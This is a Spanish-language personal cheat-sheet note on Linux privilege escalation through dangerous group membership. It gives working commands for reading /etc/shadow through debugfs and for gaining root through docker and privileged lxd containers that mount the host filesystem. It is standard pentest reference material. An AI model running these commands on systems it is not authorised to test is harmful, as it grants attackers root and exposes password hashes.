#reference #Ciberseguridad

Pertenecer a ciertos **grupos** en Linux da vías directas (o casi) a root. Comprobar siempre con `id` / `groups` tras conseguir acceso. Explotación completa en [[LinPE_cheatsheet]].

# Grupos peligrosos

| Grupo | Vía de abuso |
|-------|--------------|
| **disk** | Acceso crudo a los dispositivos de bloque → leer/escribir cualquier fichero (incl. `/etc/shadow`). |
| **docker** | Montar el FS del host o lanzar contenedor privilegiado = root. |
| **lxd / lxc** | Montar `/` del host en un contenedor privilegiado = root. |
| **sudo / wheel** | `sudo -l` → ver qué se ejecuta como root. |
| **adm** | Lectura de logs (`/var/log`) — info sensible. |
| **shadow** | Lectura de `/etc/shadow` → crackear hashes. |
| **video** | Captura del framebuffer (`/dev/fb0`). |

## disk

Si el usuario está en el grupo `disk`, puede leer ficheros arbitrarios accediendo directamente al dispositivo:

```sh
victim@machine:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
/dev/sda1         19G   2,3G   16G  14% /        # localizar la raíz
victim@machine:~$ debugfs /dev/sda1             # debug del FS con esos privilegios
debugfs:  cat /etc/shadow
...
```

## docker

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # / del host -> root
```

## lxd / lxc

```bash
lxc init alpine r -c security.privileged=true
lxc config device add r disk source=/ path=/mnt/root recursive=true
lxc start r && lxc exec r /bin/sh
```

# Recursos
### [[LinPE_cheatsheet]] · [[SUID]]
### [HackTricks — Interesting Groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe)
